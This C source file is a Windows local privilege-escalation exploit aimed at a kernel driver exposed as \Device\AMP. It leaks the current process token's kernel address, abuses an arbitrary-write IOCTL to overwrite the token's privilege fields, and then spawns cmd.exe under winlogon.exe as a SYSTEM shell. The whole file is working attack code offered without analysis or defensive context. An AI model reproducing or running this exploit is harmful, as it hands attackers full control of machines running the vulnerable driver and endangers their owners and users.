#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <stdint.h>
#include <stdio.h>
#include "Defs.h"

#pragma comment(lib, "ntdll.lib")

pNtQuerySystemInformation NtQuerySystemInformation = NULL;
pRtlInitUnicodeString RtlInitUnicodeString = NULL;
pNtCreateFile NtCreateFile = NULL;
pNtDeviceIoControlFile NtDeviceIoControlFile = NULL;

UINT_PTR GetTokenAddress()
{
    NTSTATUS status;
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE currentToken = NULL;
    UINT_PTR tokenAddress = 0;
    ULONG ulBytes = 0;
    PSYSTEM_HANDLE_INFORMATION handleTableInfo = NULL;

    BOOL success = OpenProcessToken(currentProcess, TOKEN_QUERY, &currentToken);
    if (!success)
    {
        wprintf(L"[!] Couldn't open a handle to the current process token. (Error code: %d)\n", GetLastError());
        return 0;
    }
    // Allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
    while ((status = NtQuerySystemInformation(SystemHandleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    {
        if (handleTableInfo != NULL)
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
        }

        else
        {
            handleTableInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
        }
    }

    if (status == 0)
    {
        // iterate over the system's handle table and look for the handles beloging to our process
        for (ULONG i = 0; i < handleTableInfo->NumberOfHandles; i++)
        {
            // if it finds our process and the handle matches the current token handle we already opened, print it
            if (handleTableInfo->Handles[i].UniqueProcessId == GetCurrentProcessId() && handleTableInfo->Handles[i].HandleValue == (USHORT)currentToken)
            {
                tokenAddress = (UINT_PTR)handleTableInfo->Handles[i].Object;
                break;
            }
        }
    }
    else
    {
        if (handleTableInfo != NULL)
        {
            wprintf(L"[!] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
            HeapFree(GetProcessHeap(), 0, handleTableInfo);
            CloseHandle(currentToken);
            return 0;
        }
    }

    HeapFree(GetProcessHeap(), 0, handleTableInfo);

    return tokenAddress;
}

DWORD getProcessId(const wchar_t* process)
{
    HANDLE          hSnapShot;
    PROCESSENTRY32  pe32;
    DWORD           pid;


    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        printf("\n[-] Failed to create handle CreateToolhelp32Snapshot()\n\n");
        return -1;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapShot, &pe32) == FALSE)
    {
        printf("\n[-] Failed to call Process32First()\n\n");
        return -1;
    }

    do
    {
        if (_wcsicmp(pe32.szExeFile, process) == 0)
        {
            pid = pe32.th32ProcessID;
            return pid;
        }
    } while (Process32Next(hSnapShot, &pe32));

    CloseHandle(hSnapShot);
    return 0;
}

int spawnShell()
{
    const wchar_t* process = L"winlogon.exe";
    DWORD     pid;
    HANDLE    hProcess;

    pid = getProcessId(process);

    if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)) == NULL)
    {
        wprintf(L"\n[-] Unable to open %ws process\n\n", process);
        return -1;
    }
    wprintf(L"\n[+] Opened %ws process pid=%d with PROCESS_ALL_ACCESS rights", process, pid);

    SIZE_T size;
    STARTUPINFOEXW siex = { 0 };
    siex.StartupInfo.cb = sizeof(siex);
    siex.lpAttributeList = NULL;

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);

    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(hProcess), NULL, NULL);

    PROCESS_INFORMATION pi;
    WCHAR cmdPath[] = L"C:\\Windows\\System32\\cmd.exe";
    if (!CreateProcessW(NULL, cmdPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&siex, &pi)) {
        wprintf(L"[-] Failed to create new process.\n");
        wprintf(L"    |-> %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        return FALSE;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);

    return 0;
}

int init_ntdll()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll");
    if (hNtdll == NULL)
    {
        wprintf(L"[!] Failed to load ntdll.dll! (Error code: %d)\n", GetLastError());
        return 0;
    }

    NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
    NtCreateFile = (pNtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    NtDeviceIoControlFile = (pNtDeviceIoControlFile)GetProcAddress(hNtdll, "NtDeviceIoControlFile");
    if (!NtQuerySystemInformation && !RtlInitUnicodeString && !NtCreateFile && !NtDeviceIoControlFile)
    {
        wprintf(L"[!] Failed to resolve ntdll functions\n");
        return 0;
    }
    return 1;
}

int arbitrary_write(HANDLE hDevice, input_buffer* input_buffer, size_t inputbuffer)
{
    IO_STATUS_BLOCK ioStatus;
    NTSTATUS status;
    DWORD dwbytesreturned = 0;

    status = NtDeviceIoControlFile(hDevice, NULL, NULL, NULL, &ioStatus, IOCTL_trigger_bug, input_buffer, inputbuffer, NULL, dwbytesreturned);

    if (status == NOERROR)
    {
        return 1;
    }
    else
    {
        wprintf(L"[!] arbitrary_write failed with 0x%X\n", status);
        return 0;
    }
}

int main()
{
    if (!init_ntdll())
    {
        return -1;
    }

    NTSTATUS status;
    HANDLE hDevice, eventHandle = NULL;
    UNICODE_STRING deviceName;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK ioStatus;
    RtlInitUnicodeString(&deviceName, L"\\Device\\AMP");
    InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, 0, 0);
    wprintf(L"[^] Trying to open a handle to %ws\n", deviceName.Buffer);
    status = NtCreateFile(&hDevice, GENERIC_READ | GENERIC_WRITE,
        &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);

    if (status != 0)
    {
        wprintf(L"[!] Failed to open a handle to %ws (NTSTATUS code: 0x%X)\n", deviceName.Buffer, status);
        return -1;
    }

    wprintf(L"[+] Opened a handle successfully %p\n", hDevice);
    wprintf(L"[*] Leaking the current token address\n");
    UINT_PTR tokenAddress = GetTokenAddress();

    if (tokenAddress == 0)
    {
        wprintf(L"[!] Failed to get the token address\n");
        return -1;
    }

    wprintf(L"[+] Current token address: 0x%p\n", tokenAddress);

    wprintf(L"[*] Overwritting the _SEP_TOKEN_PRIVILEGES...\n");
    arguments_to_func args = { 1, 10, 3, 4};
    input_buffer input_buffer1 = {5, 0, &args, (PVOID)(tokenAddress + 0x41)};
    input_buffer input_buffer2 = {5, 0, &args, (PVOID)(tokenAddress + 0x49)};
    input_buffer input_buffer3 = {5, 0, &args, (PVOID)(tokenAddress + 0x51)};

    if(arbitrary_write(hDevice, &input_buffer1, sizeof(input_buffer1)) && arbitrary_write(hDevice, &input_buffer2, sizeof(input_buffer2))
        && arbitrary_write(hDevice, &input_buffer3, sizeof(input_buffer3)))
    {
        wprintf(L"[+] Overwrite was successful\n");
    }
    else
    {
        wprintf(L"[!] Overwrite failed\n");
        CloseHandle(hDevice);
        return -1;
    }

    CloseHandle(hDevice);
    wprintf(L"[*] Spawning a shell\n");
    spawnShell();

    return 0;
}
